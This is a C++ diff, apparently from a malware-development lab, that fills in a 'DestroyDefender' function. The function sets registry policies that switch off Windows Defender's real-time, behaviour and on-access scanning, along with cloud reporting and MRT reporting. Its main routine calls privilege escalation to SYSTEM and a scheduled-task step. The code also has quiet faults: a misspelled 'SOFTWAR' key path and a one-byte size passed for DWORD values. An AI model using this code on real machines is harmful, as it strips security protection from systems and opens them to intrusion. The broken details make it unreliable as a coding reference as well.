@@ -196,13 +196,180 @@ std::string CheckCurrentUsername() {
 }
 
 std::string DestroyDefender() {
+    DWORD one = 1;
+    DWORD zero = 0;
     HKEY hkResult;
     DWORD dwDisposition;
-    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    int retVal;
+
+    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Policies\\Microsoft\\Windows Defender", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegCreateKeyExA A failed with retVal: " << retVal << std::endl;
+    }
     if (dwDisposition == REG_CREATED_NEW_KEY) {
         std::cout << "REG_CREATED_NEW_KEY" << std::endl;
     } else {
         std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" "DisableAntiSpyware" 1
+    retVal = RegSetValueExA(hkResult, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA A1 failed with retVal: " << retVal << std::endl;
+    }
+    // HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableRoutinelyTakingAction", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA A2 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA A3 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableAntiVirus", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA A4 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableSpecialRunningModes", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA A5 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0
+    retVal = RegSetValueExA(hkResult, "ServiceKeepAlive", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA A6 failed with retVal: " << retVal << std::endl;
+    }
+    RegCloseKey(hkResult);
+
+    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegCreateKeyExA B failed with retVal: " << retVal << std::endl;
+    }
+    if (dwDisposition == REG_CREATED_NEW_KEY) {
+        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
+    } else {
+        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA B1 failed with retVal: " << retVal << std::endl;
+    }
+    // HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableRoutinelyTakingAction", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA B2 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA B3 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableAntiVirus", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA B4 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableSpecialRunningModes" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableSpecialRunningModes", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA B5 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0
+    retVal = RegSetValueExA(hkResult, "ServiceKeepAlive", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA B6 failed with retVal: " << retVal << std::endl;
+    }
+    RegCloseKey(hkResult);
+
+    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegCreateKeyExA C failed with retVal: " << retVal << std::endl;
+    }
+    if (dwDisposition == REG_CREATED_NEW_KEY) {
+        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
+    } else {
+        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0
+    retVal = RegSetValueExA(hkResult, "SpyNetReporting", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA C1 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0
+    retVal = RegSetValueExA(hkResult, "SubmitSamplesConsent", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA C2 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "DisableBlockAtFirstSeen" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableBlockAtFirstSeen", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA C3 failed with retVal: " << retVal << std::endl;
+    }
+    RegCloseKey(hkResult);
+
+    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWAR\\Policies\\Microsoft\\MRT", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegCreateKeyExA D failed with retVal: " << retVal << std::endl;
+    }
+    if (dwDisposition == REG_CREATED_NEW_KEY) {
+        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
+    } else {
+        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1
+    retVal = RegSetValueExA(hkResult, "DontReportInfectionInformation", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA D1 failed with retVal: " << retVal << std::endl;
+    }
+    RegCloseKey(hkResult);
+
+    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegCreateKeyExA E failed with retVal: " << retVal << std::endl;
+    }
+    if (dwDisposition == REG_CREATED_NEW_KEY) {
+        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
+    } else {
+        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" -Name "ForceUpdateFromMU" -Value 0
+    retVal = RegSetValueExA(hkResult, "ForceUpdateFromMU", 0, REG_DWORD, (const BYTE*)&zero, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA E1 failed with retVal: " << retVal << std::endl;
+    }
+    RegCloseKey(hkResult);
+
+    retVal = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, &dwDisposition);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegCreateKeyExA F failed with retVal: " << retVal << std::endl;
+    }
+    if (dwDisposition == REG_CREATED_NEW_KEY) {
+        std::cout << "REG_CREATED_NEW_KEY" << std::endl;
+    } else {
+        std::cout << "REG_OPENED_EXISTING_KEY" << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableRealtimeMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA F1 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableOnAccessProtection", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA F2 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableBehaviorMonitoring", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA F3 failed with retVal: " << retVal << std::endl;
+    }
+    // "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1
+    retVal = RegSetValueExA(hkResult, "DisableScanOnRealtimeEnable", 0, REG_DWORD, (const BYTE*)&one, 1);
+    if (retVal != ERROR_SUCCESS) {
+        std::cout << "RegSetValueExA F4 failed with retVal: " << retVal << std::endl;
     }
     RegCloseKey(hkResult);
 
@@ -251,6 +418,7 @@ std::string AddTaskScheduler() {
 
 } // namespace lab6
 
+// needs elevated run to privesc to system
 int main (int argc, char *argv[]) {
     std::cout << "EnableDebugPrivs: " << lab6::EnableDebugPrivs() << std::endl;
     std::cout << "ElevateToSystem: " << lab6::ElevateToSystem() << std::endl;
